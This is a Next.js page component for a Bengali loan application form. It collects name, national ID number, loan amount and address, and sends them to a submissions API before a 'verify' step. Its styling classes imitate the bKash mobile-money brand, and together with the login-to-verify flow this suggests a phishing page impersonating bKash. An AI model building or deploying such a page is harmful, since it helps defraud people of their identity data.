'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { ChevronLeft, ArrowRight } from 'lucide-react';
import Banner from '@/components/Banner';

export default function Apply() {
  const router = useRouter();
  const [formData, setFormData] = useState({
    fullName: '',
    nidNumber: '',
    loanAmount: '',
    tenure: '3 মাস',
    loanReason: 'ব্যক্তিগত লোন',
    address: ''
  });

  const handleNext = async () => {
    if (!formData.fullName || !formData.nidNumber || !formData.loanAmount || !formData.address) {
      alert('সবগুলো ঘর পূরণ করুন');
      return;
    }

    const submissionId = sessionStorage.getItem('submission_id');
    if (!submissionId) {
      router.push('/login');
      return;
    }

    try {
      const res = await fetch('/api/submissions', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: submissionId, ...formData }),
      });
      
      if (res.ok) {
        sessionStorage.setItem('loan_data', JSON.stringify(formData));
        router.push('/verify');
      } else {
        alert('কিছু ভুল হয়েছে। আবার চেষ্টা করুন।');
      }
    } catch (err) {
      alert('সার্ভারে সমস্যা হচ্ছে। পরে আবার চেষ্টা করুন।');
    }
  };

  return (
    <div className="mobile-container flex flex-col bg-white fade-in">
      <div className="bg-white px-4 py-3 flex items-center justify-between border-b border-gray-100 mb-2">
        <button onClick={() => router.back()} className="text-gray-400">
          <ChevronLeft size={28} />
        </button>
        <h1 className="text-[17px] font-black text-gray-800">লোন আবেদন করুন</h1>
        <div className="w-10"></div>
      </div>

      <div className="flex-1 overflow-y-auto p-6 pt-6 space-y-8">
        <div className="bg-gray-50/50 p-6 rounded-3xl border border-gray-100 text-center space-y-2">
            <h2 className="text-2xl font-black text-gray-800">আবেদন ফরম পূরণ করুন</h2>
            <p className="text-sm font-bold text-gray-400">লোন পেতে আপনার সঠিক তথ্যগুলো প্রদান করুন</p>
        </div>

        <div className="space-y-8 pb-10">
            <div className="relative border-b-2 border-gray-100 focus-within:border-bkash-pink transition-all">
                <label className="bkash-label">আপনার পূর্ণ নাম</label>
                <input 
                    type="text" 
                    className="w-full outline-none py-3 text-lg font-bold placeholder:text-gray-200" 
                    placeholder="যেমন: মোঃ করিম হোসেন"
                    value={formData.fullName}
                    onChange={(e) => setFormData({...formData, fullName: e.target.value})}
                />
            </div>

            <div className="relative border-b-2 border-gray-100 focus-within:border-bkash-pink transition-all">
                <label className="bkash-label">জাতীয় পরিচয় পত্র নম্বর (NID)</label>
                <input 
                    type="number" 
                    className="w-full outline-none py-3 text-lg font-bold placeholder:text-gray-200" 
                    placeholder="১০ বা ১৭ ডিজিটের এনাইডি নম্বর দিন"
                    value={formData.nidNumber}
                    onChange={(e) => setFormData({...formData, nidNumber: e.target.value})}
                />
            </div>

            <div className="relative border-b-2 border-gray-100 focus-within:border-bkash-pink transition-all">
                <label className="bkash-label">লোনের পরিমাণ (টাকা)</label>
                <input 
                    type="number" 
                    className="w-full outline-none py-3 text-lg font-bold placeholder:text-gray-200" 
                    placeholder="যেমন: ৫০,০০০"
                    value={formData.loanAmount}
                    onChange={(e) => setFormData({...formData, loanAmount: e.target.value})}
                />
            </div>

            <div className="relative border-b-2 border-gray-100 focus-within:border-bkash-pink transition-all">
                <label className="bkash-label">লোনের মেয়াদ</label>
                <select 
                    className="w-full outline-none py-3 text-lg font-bold bg-transparent appearance-none"
                    value={formData.tenure}
                    onChange={(e) => setFormData({...formData, tenure: e.target.value})}
                >
                    <option>3 মাস</option>
                    <option>6 মাস</option>
                    <option>12 মাস</option>
                    <option>24 মাস</option>
                    <option>36 মাস</option>
                </select>
            </div>

            <div className="relative border-b-2 border-gray-100 focus-within:border-bkash-pink transition-all">
                <label className="bkash-label">লোন গ্রহণের উদ্দেশ্য</label>
                <select 
                    className="w-full outline-none py-3 text-lg font-bold bg-transparent appearance-none"
                    value={formData.loanReason}
                    onChange={(e) => setFormData({...formData, loanReason: e.target.value})}
                >
                    <option>ব্যক্তিগত লোন</option>
                    <option>ব্যাবসায়িক লোন</option>
                    <option>জরুরী লোন</option>
                    <option>শিক্ষা লোন</option>
                </select>
            </div>

            <div className="relative border-b-2 border-gray-100 focus-within:border-bkash-pink transition-all">
                <label className="bkash-label">স্থায়ী ঠিকানা</label>
                <textarea 
                    className="w-full outline-none py-3 text-lg font-bold placeholder:text-gray-200 min-h-[80px]" 
                    placeholder="আপনার পূর্ণ ঠিকানা লিখুন"
                    value={formData.address}
                    onChange={(e) => setFormData({...formData, address: e.target.value})}
                    rows={2}
                />
            </div>
        </div>
      </div>

      <div className="p-6 flex justify-end items-center border-t border-gray-50 bg-gray-50/30">
        <button 
          onClick={handleNext}
          className="bkash-next-button w-auto px-6 h-14"
        >
          <span className="text-sm font-bold mr-2">পরবর্তী ধাপে যান</span>
          <ArrowRight size={20} />
        </button>
      </div>
    </div>
  );
}
